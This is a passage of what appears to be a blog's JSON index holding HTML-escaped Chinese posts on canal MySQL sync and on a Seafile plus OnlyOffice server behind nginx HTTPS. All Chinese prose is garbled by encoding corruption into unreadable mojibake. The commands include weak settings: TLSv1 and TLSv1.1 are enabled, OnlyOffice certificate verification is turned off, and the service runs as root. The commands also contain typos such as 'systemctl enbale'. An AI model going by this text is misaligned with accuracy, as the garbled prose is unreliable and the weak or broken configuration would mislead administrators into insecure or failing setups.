class=\"cl\"\u003eåº“ï¼šxxl_job_bak\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¡¨ï¼šdemotable666\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè€Œä¸”ä¸ç”¨ä»»ä½•çš„Zookeeperã€Kafkaã€RabbitMQçš„ä¸­é—´ä»¶ï¼Œè¶Šç®€æ´è¶Šå¥½ã€‚\u003c/p\u003e\n\u003ch5 id=\"ä¸€å®‰è£…canal\"\u003eä¸€ã€å®‰è£…canal\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.adapter-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#éƒ½è£…åˆ° /app ç›®å½•ä¸‹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app/deploy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app/adapter\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/deploy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf canal.deployer-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app/adapter\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf canal.adapter-1.1.5.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒmysqlæºå‡†å¤‡\"\u003eäºŒã€MySQLæºå‡†å¤‡\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# /etc/my.cnf åŠ å…¥ä»¥ä¸‹å‡ é¡¹å¹¶é‡å¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emysqld\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-bin\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql-bin \u003cspan class=\"c1\"\u003e# Start log bin.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebinlog_format\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eROW \u003cspan class=\"c1\"\u003e# Log format.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver-id\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Server id,different from slave.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆæƒbinlogåŒæ­¥ï¼š\u003c/p\u003e","title":"è¿ç»´æ–¹æ¡ˆä¹‹canalæ•°æ®åº“åŒæ­¥"},{"content":"ä¹‹å‰å…¬å¸ä¸€ç›´ç”¨çš„æ˜¯ seafile æ¥ä¿å­˜æ–‡æ¡£ï¼Œéå¸¸å¥½ç”¨ï¼Œä¹Ÿå‡ºè¿‡ä¸€æ¬¡å¤§äº‹ï¼Œä¸€ä¸ªç¦»èŒçš„å‘˜å·¥æ¸…ç©ºç”µè„‘ï¼Œç„¶åç›´æ¥æŠŠsefaileæ–‡ä»¶å¤¹ä¹ŸåŒæ­¥æ¸…ç©ºäº†ï¼Œå¥½åœ¨æœ‰ç‰ˆæœ¬ï¼Œæœ€åæ‰¾äº†å›æ¥ã€‚\næ¢åˆ°æ–°å…¬å¸ï¼Œè´¢åŠ¡ä¹Ÿæäº†å…±äº«äº‘ç›˜çš„è¦æ±‚ï¼Œè¿˜è¦æ±‚èƒ½å¤šäººåŒæ—¶åœ¨çº¿ç¼–è¾‘ã€‚\né‚£å°±è¯•ç€æ­å»º seafile + onlyoffice äº†ï¼ŒåŒæ—¶è¦æ±‚æé«˜å®‰å…¨æ€§ï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œæ²¡å‡ ä¸ªå¯¹çš„ï¼Œå°¤å…¶æ˜¯å¯¹httpsè¿™ä¸€å—ï¼ŒèŠ±äº†2å¤©æ—¶é—´æ­å»ºï¼Œè®°å½•ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼š\nä¸€ã€ä¸‹è½½seafileï¼š æ²¡æœ‰é€‰å®šé«˜ç‰ˆæœ¬çš„ï¼Œæœ€æ–°ç‰ˆæœ¬çš„å˜åŒ–å¤ªå¤šï¼Œç¼ºçœå…¨éƒ¨éƒ½å®‰è£…åˆ° /app ç›®å½•ä¸‹\nwget https://download.seadrive.org/seafile-server_7.0.0_x86-64.tar.gz tar zxvf seafile-server_7.0.0_x86-64.tar.gz mkdir /app mv seafile-server-7.0.0 /app äºŒã€è®¾å®šCentOS7 ä¾ç„¶æ´»åœ¨ CentOS 7.10 çš„æ—¶ä»£ï¼Œå†å¾€ä¸Šå‡çº§ï¼Œè¦å‡åˆ° rokey linux äº†\næé†’ï¼šseafile çš„å®‰è£…æ ¹æ®ç‰ˆæœ¬ä¸åŒï¼Œyum è£…çš„ä¸œè¥¿ä¹Ÿä¸å°½ç„¶ç›¸åŒçš„ï¼Œè¦å»å®˜æ–¹æ–‡æ¡£çœ‹\nyum install python python-setuptools MySQL-python python-urllib3 python-ldap -y ä¸‰ã€å®‰è£…MySQLæ•°æ®åº“ è¿™ä¸ªå°±ä»è€…è§ä»ã€æ™ºè€…è§æ™ºäº†ï¼Œæˆ‘ç°åœ¨çš„æ–¹å¼éƒ½æ˜¯äºŒè¿›åˆ¶è£…ï¼Œé€‰ç”¨çš„æ˜¯ mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz å®‰è£…çš„ï¼Œ\ntar zxvf mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz mv mysql-5.6.51-linux-glibc2.12-x86_64 /app yum -y install autoconf libaio* cat\u0026lt;\u0026lt;EOF\u0026gt;/etc/my.cnf [mysql] # è®¾ç½®mysqlå®¢æˆ·ç«¯é»˜è®¤å­—ç¬¦é›† default-character-set=utf8 socket=/tmp/mysql.sock [mysqld] skip-name-resolve #è®¾ç½®3306ç«¯å£ port = 3306 socket=/tmp/mysql.sock # è®¾ç½®mysqlçš„å®‰è£…ç›®å½• basedir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/ # è®¾ç½®mysqlæ•°æ®åº“çš„æ•°æ®çš„å­˜æ”¾ç›®å½• datadir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/data # å…è®¸æœ€å¤§è¿æ¥æ•° max_connections=200 # æœåŠ¡ç«¯ä½¿ç”¨çš„å­—ç¬¦é›†é»˜è®¤ä¸º8æ¯”ç‰¹ç¼–ç çš„latin1å­—ç¬¦é›† character-set-server=utf8 # åˆ›å»ºæ–°è¡¨æ—¶å°†ä½¿ç”¨çš„é»˜è®¤å­˜å‚¨å¼•æ“ default-storage-engine=INNODB #lower_case_table_name=1 max_allowed_packet=16M sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES EOF groupadd -g mysql useradd -g mysql mysql # åˆå§‹åŒ–DB cd /app/mysql-5.6.51-linux-glibc2.12-x86_64/ /app/mysql-5.6.51-linux-glibc2.12-x86_64/scripts/mysql_install_db --user=mysql #å»ºç«‹ /etc/init.d/mysql çš„è½¯é“¾æ¥ mysql -\u0026gt; /app/mysql-5.6.51/support-files/mysql.server #å¯åŠ¨ /etc/init.d/mysql start # å®‰å…¨è®¾ç½®DB cd /app/mysql-5.6.51-linux-glibc2.12-x86_64/ /app/mysql-5.6.51-linux-glibc2.12-x86_64/bin/mysql_secure_installation å››ã€å‡†å¤‡onlyoffice è¿™é‡Œæœ‰å¤§å‘å•Šï¼Œå…¶å®onlyofficeçš„ç‰ˆæœ¬ä¸‡ä¸‡ä¸èƒ½ç”¨æœ€æ–°çš„ï¼Œå› ä¸ºJWTçš„Tokenè®¤è¯\næ‰€ä»¥å¿…é¡»ç”¨ä½ç‰ˆæœ¬çš„ï¼Œç„¶åå‘¢ç”±äºå®ƒå…¶å®æ˜¯ä¸€ç»„ç¨‹åºï¼Œè°ƒç”¨çš„æ—¶å€™åˆæ˜¯åªç”¨webï¼Œæ‰€ä»¥å°åœ¨dockeré‡Œæœ€å¥½\ncd /etc/yum.repos.d/ wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo yum -y install docker-ce systemctl enable --now docker.service #å‡†å¤‡å¥½è¯ä¹¦ç›®å½• mkdir /app/onlyoffice/certs #ç”¨legoç”³è¯·å¥½çš„let\u0026#39;s encryptå…è´¹è¯ä¹¦æˆ–è€…æ­£å¼è¯ä¹¦ #åªèƒ½å«è¿™ä¸¤ä¸ªåå­—ï¼Œå…¶ä»–ä¸è¡Œï¼ï¼ï¼ï¼ onlyoffice.crt onlyoffice.key #ç”Ÿæˆdh cd /app/onlyoffice/certs openssl dhparam -out dhparam.pem 2048 #è·‘å®¹å™¨ docker run -i -t -d -p 8443:443 --restart=always -v /app/onlyoffice:/var/www/onlyoffice/Data onlyoffice/documentserver:6.4.2.6 æˆ‘ä»¬è¿™é‡Œé€‰ç”¨ onlyoffice 6.4.2.6 ç‰ˆæœ¬çš„ï¼ŒåŒæ—¶æ‰“å¼€8443:443çš„ç«¯å£ï¼Œæ„å‘³ç€æˆ‘ä»¬å‡†å¤‡è¦è·‘httpsï¼Œç„¶åonlyofficeçš„è¯ä¹¦æ˜¯å¦‚ä¸Šçš„è®¾å®šæ–¹æ³•ï¼Œç½‘ä¸Šä¸€å †èƒ¡è¯´å…«é“ç›´æ¥æ”¾å¼€443ä½†æ˜¯æ— è¯ä¹¦çš„ï¼Œæœ‰çš„è¿˜è¦è¿›å»dockeræ”¹ï¼Œéƒ½ä¸å¯¹ã€‚\näº”ã€å®‰è£…seafile è¿™ä¸ªå¾ˆç®€å•ï¼Œä½†ä¹Ÿå¾ˆå‘\ncd /app/seafile-server-7.0.0/ ./setup-seafile-mysql.sh #å›ç­”é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªç­”ï¼š seafile #ç¬¬äºŒä¸ªç­”åŸŸåï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯çœŸçš„ç”¨åŸŸå seafile.rendoumi.com #å‰©ä¸‹é€‰å›è½¦ è¿™é‡Œé‡åˆ°ä¸ªå¤§å‘ï¼Œç”±äºæˆ‘ä»¬mysqlå®‰è£…é€‰æ‹©äº†secureçš„æ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå®‰ä¸è¿‡å»\næŠ¥seafileç”¨æˆ·æ— æƒé™ï¼Œæ²¡åŠæ³•ï¼Œç”¨navicatï¼Œè¿›å»çœ‹ç”¨æˆ·ï¼Œå®‰è£…è„šæœ¬ç»™æˆ‘ä»¬ç”Ÿæˆäº†ä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯æ˜¯localhostæƒé™çš„ï¼Œæˆ‘ä»¬æ”¹æˆ127.0.0.1ï¼Œç„¶åä¿å­˜\né‡æ–°å®‰è£…ï¼Œå°±å¯ä»¥å®‰è£…æˆåŠŸäº†ã€‚\nç„¶åå°±æ˜¯å…ˆåˆå§‹åŒ–ä¸€ä¸‹ï¼š\ncd /app/seafile-server-latest/ ./seafile.sh start #è®¾ç½®ç®¡ç†å‘˜å’Œå¯†ç  ./seahub.sh start ç„¶åéƒ½åœæ‰ ./seahub.sh stop ./seafile.sh stop å‡†å¤‡å®‰å…¨é…ç½®\ncd /app/conf/ #vi ccnet.conf # NAMEå’ŒSERVIcE_URLå°±æ˜¯ä¸Šé¢å®‰è£…æ—¶æˆ‘ä»¬å›ç­”çš„2ä¸ªé—®é¢˜ NAME = seafile SERVICE_URL = https://seafile.rendoumi.com #vi seafile.conf # å¢åŠ hostç›‘å¬åœ°å€ä¸º127.0.0.1ï¼Œç¨åæˆ‘ä»¬è®¾ç½®nginxè½¬å‘ï¼Œæ›´åŠ å®‰å…¨ [fileserver] host = 127.0.0.1 port = 8082 #vi seahub_settings.py # å¢åŠ ä»¥ä¸‹å„é¡¹ï¼Œæœ‰onlyofficeçš„ï¼Œæœ‰8082çš„ FILE_SERVER_ROOT = \u0026#39;https://seafile.rendoumi.com/seafhttp\u0026#39; MAX_NUMBER_OF_FILES_FOR_FILEUPLOAD = 5000 ENABLE_ONLYOFFICE = True VERIFY_ONLYOFFICE_CERTIFICATE = False ONLYOFFICE_APIJS_URL = \u0026#39;https://seafile.rendoumi.com:8443/web-apps/apps/api/documents/api.js\u0026#39; ONLYOFFICE_FILE_EXTENSION = (\u0026#39;doc\u0026#39;, \u0026#39;docx\u0026#39;, \u0026#39;ppt\u0026#39;, \u0026#39;pptx\u0026#39;, \u0026#39;xls\u0026#39;, \u0026#39;xlsx\u0026#39;, \u0026#39;odt\u0026#39;, \u0026#39;fodt\u0026#39;, \u0026#39;odp\u0026#39;, \u0026#39;fodp\u0026#39;, \u0026#39;ods\u0026#39;, \u0026#39;fods\u0026#39;) ONLYOFFICE_EDIT_FILE_EXTENSION = (\u0026#39;docx\u0026#39;, \u0026#39;pptx\u0026#39;, \u0026#39;xlsx\u0026#39;,\u0026#39;doc\u0026#39;,\u0026#39;xls\u0026#39;,\u0026#39;ppt\u0026#39;) å‡†å¤‡systemctlçš„å¯åŠ¨æ–‡ä»¶\ncat \u0026lt;\u0026lt;EOF\u0026gt;/etc/systemd/system/seafile.service [Unit] Description=Seafile Server After=network.target mariadb.service [Service] Type=oneshot ExecStart=/app/seafile-server-latest/seafile.sh start ExecStart=/app/seafile-server-latest/seahub.sh start ExecStop=/app/seafile-server-latest/seafile.sh stop ExecStop=/app/seafile-server-latest/seahub.sh stop RemainAfterExit=yes User=root Group=root [Install] WantedBy=multi-user.target EOF ç„¶åæˆ‘ä»¬ç°åœ¨å¯ä»¥æ­£å¼å¯åŠ¨seafileäº†\nsystemctl daemon-reload systemctl start seafile å…­ã€å®‰è£…nginx yum -y install epel-release yum -y install nginx # ç”Ÿæˆdh cd /etc/nginx/ openssl dhparam -out dhparam.pem 2048 vi /etc/nginx/nginx.conf #å¢åŠ ä»¥ä¸‹è¿™ä¸ªå¤§æ®µ server { listen 80; server_name seafile.rendoumi.com; rewrite ^ https://$http_host$request_uri? permanent; } server { listen 443 ssl; server_name seafile.rendoumi.com; ssl_certificate /etc/nginx/seafile.crt; #cacert.pem æ–‡ä»¶è·¯å¾„ ssl_certificate_key /etc/nginx/seafile.key; #privkey.pem æ–‡ä»¶è·¯å¾„ ssl_dhparam /etc/nginx/dhparam.pem; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers \u0026#39;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA256-SHA:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-SEED-SHA:DHE-RSA-CAMELLIA128-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS\u0026#39;; ssl_prefer_server_ciphers on; proxy_set_header X-Forwarded-For $remote_addr; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains\u0026#34;; server_tokens off; location / { proxy_pass http://127.0.0.1:8000; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Host $server_name; proxy_set_header X-Forwarded-Proto https; access_log /var/log/nginx/seahub.access.log; error_log /var/log/nginx/seahub.error.log; proxy_read_timeout 1200s; client_max_body_size 0; } location /seafhttp { rewrite ^/seafhttp(.*)$ $1 break; proxy_pass http://127.0.0.1:8082; client_max_body_size 0; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_connect_timeout 36000s; proxy_read_timeout 36000s; proxy_send_timeout 36000s; send_timeout 36000s; } location /media { root /app/seafile-server-latest/seahub; #seahubçš„è·¯å¾„ } } ä»¥ä¸Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œseafileå®é™…ç›‘å¬äº†127.0.0.1:8000å’Œ127.0.0.1:8082ç«¯å£ï¼Œè¢«ä»£ç†åˆ°äº†nginxï¼Œè¿™æ ·ç›‘å¬åœ¨æœ¬åœ°ï¼Œnginxå†å¥—ä¸Šhttpsè¯ä¹¦ï¼Œå°±å¾ˆå®‰å…¨äº†ï¼Œå¯åŠ¨\nsystemctl enbale --now nginx ä¸ƒã€è®¾ç½®seafile ç„¶åæˆ‘ä»¬ç™»å½• https://seafile.rendoumi.com, ä¿®æ”¹ä¸€ä¸‹é…ç½®\nç¡®ä¿è®¾ç½®æ­£ç¡®ï¼š\nSERVICE_URLè®¾ç½®çš„æ˜¯ `https://seafile.rendoumi.com` FILE_SERVER_ROOT è®¾ç½®çš„æ˜¯ `https://seafile.rendoumi.com/seafhttp` ç„¶åå°±å¯ä»¥äº†ï¼Œseafileå°±å¯ä»¥åœ¨çº¿ç¼–è¾‘äº†ã€‚\nå…«ã€é™„åŠ onlyofficeä¿®æ”¹ æˆ‘ä»¬è¿˜éœ€è¦å¢åŠ ä¸€ç‚¹ç‰¹è‰²ï¼Œç»™onlyofficeåšä¸€äº›ä¿®æ”¹ï¼š\n1ã€è‡ªåŠ¨ä¿å­˜\nè¿›å…¥onlyofficeå®¹å™¨\ndocker exec -it å®¹å™¨ /bin/bash echo \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /etc/timezone ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime date -R nano /etc/onlyoffice/documentserver/local.json { \u0026#34;services\u0026#34;: { \u0026#34;CoAuthoring\u0026#34;: { // åœ¨ CoAuthoring ä¸­ å¢åŠ  autoAssembly å±æ€§é…ç½® \u0026#34;autoAssembly\u0026#34;: { \u0026#34;enable\u0026#34;: true, \u0026#34;interval\u0026#34;: \u0026#34;5m\u0026#34; }, //æ³¨æ„è¿™ä¸ªï¼Œé€—å· } } } 2ã€å®‰è£…å­—ä½“\nå­—ä½“æ–‡ä»¶æ”¾è¿›ä¸€ä¸ªzipçš„å‹ç¼©åŒ…ï¼Œå…¶ä¸­ä¸€ä¸ªç›®å½•åä¸ºofficeï¼Œé‡Œé¢æ˜¯æ–‡ä»¶\nç„¶åæŠŠæ–‡ä»¶ä¼ è¿›Linuxæœºå™¨ä¸­ï¼Œè§£å‹\nexport LANG=zh_CN.UTF-8 unzip -x office.zip cd office ls æŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŠ¡å¿…åƒä¸‹é¢ä¸€æ ·ï¼Œæ˜¯ä¸­æ–‡çš„\nç„¶ååœ¨officeç›®å½•é‚£ä¸€çº§ï¼ŒæŠŠå­—ä½“æ–‡ä»¶æ‹·è´è¿›å®¹å™¨\ndocker cp office 472bf8a36f14:/usr/share/fonts/truetype/custom è¿›å…¥å®¹å™¨\ndocker exec -it 472bf8a36f14 /bin/bash # æ›´æ–°å­—ä½“ mkfontscale mkfontdir fc-cache -fv documentserver-generate-allfonts.sh #é€€å‡ºå®¹å™¨ï¼Œé‡å¯ docker restart 472bf8a36f14 ç„¶åonlyofficeå°±ä¼š5åˆ†é’Ÿè‡ªåŠ¨ä¿å­˜ä¸€ä¸‹ï¼Œç„¶åå¤šäº†ä¸€å †å¥½çœ‹çš„ä¸­æ–‡å­—ä½“ï¼š\n","permalink":"https://rendoumi.com/posts/20230115-seafile_onlyoffice/","summary":"\u003cp\u003eä¹‹å‰å…¬å¸ä¸€ç›´ç”¨çš„æ˜¯ seafile æ¥ä¿å­˜æ–‡æ¡£ï¼Œéå¸¸å¥½ç”¨ï¼Œä¹Ÿå‡ºè¿‡ä¸€æ¬¡å¤§äº‹ï¼Œä¸€ä¸ªç¦»èŒçš„å‘˜å·¥æ¸…ç©ºç”µè„‘ï¼Œç„¶åç›´æ¥æŠŠsefaileæ–‡ä»¶å¤¹ä¹ŸåŒæ­¥æ¸…ç©ºäº†ï¼Œå¥½åœ¨æœ‰ç‰ˆæœ¬ï¼Œæœ€åæ‰¾äº†å›æ¥ã€‚\u003c/p\u003e\n\u003cp\u003eæ¢åˆ°æ–°å…¬å¸ï¼Œè´¢åŠ¡ä¹Ÿæäº†å…±äº«äº‘ç›˜çš„è¦æ±‚ï¼Œè¿˜è¦æ±‚èƒ½å¤šäººåŒæ—¶åœ¨çº¿ç¼–è¾‘ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å°±è¯•ç€æ­å»º seafile + onlyoffice äº†ï¼ŒåŒæ—¶è¦æ±‚æé«˜å®‰å…¨æ€§ï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œæ²¡å‡ ä¸ªå¯¹çš„ï¼Œå°¤å…¶æ˜¯å¯¹httpsè¿™ä¸€å—ï¼ŒèŠ±äº†2å¤©æ—¶é—´æ­å»ºï¼Œè®°å½•ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€ä¸‹è½½seafile\"\u003eä¸€ã€ä¸‹è½½seafileï¼š\u003c/h5\u003e\n\u003cp\u003eæ²¡æœ‰é€‰å®šé«˜ç‰ˆæœ¬çš„ï¼Œæœ€æ–°ç‰ˆæœ¬çš„å˜åŒ–å¤ªå¤šï¼Œç¼ºçœå…¨éƒ¨éƒ½å®‰è£…åˆ° /app ç›®å½•ä¸‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.seadrive.org/seafile-server_7.0.0_x86-64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf seafile-server_7.0.0_x86-64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv seafile-server-7.0.0 /app\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒè®¾å®šcentos7\"\u003eäºŒã€è®¾å®šCentOS7\u003c/h5\u003e\n\u003cp\u003eä¾ç„¶æ´»åœ¨ CentOS 7.10 çš„æ—¶ä»£ï¼Œå†å¾€ä¸Šå‡çº§ï¼Œè¦å‡åˆ° rokey linux äº†\u003c/p\u003e\n\u003cp\u003eæé†’ï¼šseafile çš„å®‰è£…æ ¹æ®ç‰ˆæœ¬ä¸åŒï¼Œyum è£…çš„ä¸œè¥¿ä¹Ÿä¸å°½ç„¶ç›¸åŒçš„ï¼Œè¦å»å®˜æ–¹æ–‡æ¡£çœ‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install python python-setuptools MySQL-python python-urllib3 python-ldap -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"ä¸‰å®‰è£…mysqlæ•°æ®åº“\"\u003eä¸‰ã€å®‰è£…MySQLæ•°æ®åº“\u003c/h5\u003e\n\u003cp\u003eè¿™ä¸ªå°±ä»è€…è§ä»ã€æ™ºè€…è§æ™ºäº†ï¼Œæˆ‘ç°åœ¨çš„æ–¹å¼éƒ½æ˜¯äºŒè¿›åˆ¶è£…ï¼Œé€‰ç”¨çš„æ˜¯ mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz å®‰è£…çš„ï¼Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv mysql-5.6.51-linux-glibc2.12-x86_64 /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install autoconf libaio*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;/etc/my.cnf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[mysql]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# è®¾ç½®mysqlå®¢æˆ·ç«¯é»˜è®¤å­—ç¬¦é›†\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edefault-character-set=utf8\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esocket=/tmp/mysql.sock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[mysqld]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eskip-name-resolve\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#è®¾ç½®3306ç«¯å£\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eport = 3306\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esocket=/tmp/mysql.sock\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e# è®¾ç½®mysqlçš„å®‰è£…ç›®å½•\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 